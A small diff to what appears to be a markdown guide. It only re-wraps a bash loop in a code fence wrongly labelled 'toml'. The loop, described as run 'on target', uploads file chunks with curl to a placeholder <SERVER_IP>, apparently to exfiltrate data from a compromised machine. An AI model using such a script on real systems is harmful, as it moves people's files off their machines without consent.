@@ -19,7 +19,8 @@ chunk_ac
 
 Step 2: Upload chunks with curl by creating a bash file on target with below: (Ensure you modify values like <SERVER_IP>)
 
-`TOTAL=$(ls chunk_* | wc -l)
+```toml
+TOTAL=$(ls chunk_* | wc -l)
 INDEX=0
 
 for f in chunk_*; do
@@ -30,4 +31,4 @@ for f in chunk_*; do
     -F "total_chunks=$TOTAL"
 
   INDEX=$((INDEX+1))
-done`
+done```
